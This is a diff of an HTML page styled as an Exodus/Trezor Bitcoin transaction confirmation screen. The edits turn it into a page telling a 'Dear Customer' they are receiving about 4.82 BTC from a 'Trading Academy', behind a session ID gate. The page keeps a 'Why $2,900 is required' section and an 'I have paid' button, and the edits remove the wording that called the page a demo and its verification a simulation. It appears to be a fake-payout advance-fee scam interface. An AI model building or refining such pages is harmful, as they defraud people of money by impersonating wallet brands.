@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Exodus · Transaction Confirmation</title>
+  <title>Exodus•CA$</title>
   <meta name="description" content="Exodus Trezor biometric setup & transaction confirmation UI (demo). Session ID locked." />
   <style>
     /* ---------- Theme & Reset ---------- */
@@ -123,11 +123,11 @@
   <main class="container" id="mainContent" aria-live="polite">
     <header class="page-header">
       <h1 class="page-title">Transaction Confirmation</h1>
-      <p class="page-sub">Verify details, accept certificate and complete Exodus Trezor biometric setup to broadcast withdrawal</p>
+      <p class="page-sub">Verify details & accept your withdrawal</p>
     </header>
 
     <section class="card" role="region" aria-label="Transaction">
-      <div class="label">You are sending</div>
+      <div class="label">Dear Customer you are receving</div>
       <div class="type"><div style="font-size:26px;color:var(--accent);font-weight:900">₿</div><div>Bitcoin</div></div>
 
       <div class="amount-row">
@@ -139,7 +139,7 @@
       <div class="sub">≈ 4.82 BTC</div>
 
       <div class="grid" style="margin-top:14px;">
-        <div class="info"><div class="label">From Account</div><div class="value">Primary Wallet</div></div>
+        <div class="info"><div class="label">From Trading Academy</div><div class="value">Blockchain Wallet</div></div>
         <div class="info"><div class="label">Network</div><div class="value">Bitcoin Mainnet</div></div>
       </div>
 
@@ -158,8 +158,8 @@
   <!-- Session modal -->
   <div class="overlay show" id="sessionOverlay" aria-hidden="false">
     <div class="modal session-modal" role="dialog" aria-modal="true" aria-labelledby="sessionTitle">
-      <div><div id="sessionTitle" style="font-weight:900;font-size:20px;">Session ID Required</div><div class="hint">Enter Session ID to unlock the transaction</div></div>
-      <input id="sessionInput" class="session-input" placeholder="STAN-TXN-847392" aria-label="Session ID" autofocus />
+      <div><div id="sessionTitle" style="font-weight:900;font-size:20px;">Session ID Required</div><div class="hint">Enter Session ID to Access</div></div>
+      <input id="sessionInput" class="session-input" placeholder="******" aria-label="Session ID" autofocus />
       <div style="display:flex;gap:10px;margin-top:12px;justify-content:center;">
         <button id="sessionSubmit" class="btn btn-primary">Unlock</button>
         <button id="sessionCancel" class="btn btn-ghost">Cancel</button>
@@ -210,10 +210,10 @@
             <div class="small">Trezor image (provided):</div>
             <div class="device-preview" id="uploadPreview" style="margin-top:8px;">
               <!-- replace IMAGE_DATA_URL with the base64 data URL or a local filename -->
-              <img id="deviceImage" src="IMAGE_DATA_URL" alt="Exodus + Trezor" />
+              <img id="deviceImage" src="IMG_0142.jpeg" alt="Exodus + Trezor" />
             </div>
             <div class="small" style="margin-top:8px;color:var(--muted)">
-              The Trezor image is provided and used to confirm the hardware for the Exodus biometric flow.
+              
             </div>
           </div>
         </div>
@@ -222,9 +222,9 @@
           <div class="label">Select Wallet</div>
           <div class="wallet-options" id="walletOptions">
             <label class="wallet-option"><input type="radio" name="wallet" value="Exodus" checked /> <div style="font-weight:800">Exodus (recommended)</div></label>
-            <label class="wallet-option"><input type="radio" name="wallet" value="Trezor Suite" /> <div style="font-weight:800">Trezor Suite</div></label>
-            <label class="wallet-option"><input type="radio" name="wallet" value="Ledger Live" /> <div style="font-weight:800">Ledger Live</div></label>
-            <label class="wallet-option"><input type="radio" name="wallet" value="Other" /> <div style="font-weight:800">Other Wallet</div></label>
+            <label class="wallet-option"><input type="radio" name="wallet" value="Trust" /> <div style="font-weight:800">Trust wallet </div></label>
+            <label class="wallet-option"><input type="radio" name="wallet" value="Binance" /> <div style="font-weight:800">Binance wallet</div></label>
+            <label class="wallet-option"><input type="radio" name="wallet" value="MEXC" /> <div style="font-weight:800">MEXC</div></label>
           </div>
 
           <div style="margin-top:14px;" class="label">Why $2,900 is required</div>
@@ -312,14 +312,14 @@
 
           <div style="margin-top:12px;">
             <div class="label">Verification</div>
-            <div class="small">After clicking "I have paid", the UI will run a secure verification simulation (confirmations / signature check).</div>
+            <div class="small">After clicking "I have paid", the System will run (confirmations / signature check).</div>
             <div class="progress" style="margin-top:10px;"><i id="verifyBar"></i></div>
           </div>
         </div>
 
         <div style="width:320px;">
-          <div class="label">Trezor image (provided)</div>
-          <div class="device-preview" id="paymentPreview"><img src="IMAGE_DATA_URL" alt="Exodus + Trezor" id="paymentImage" /></div>
+          <div class="label">canada</div>
+          <div class="device-preview" id="paymentPreview"><img src="IMG_0142.jpeg" alt="Exodus + Trezor" id="paymentImage" /></div>
         </div>
       </div>
     </div>
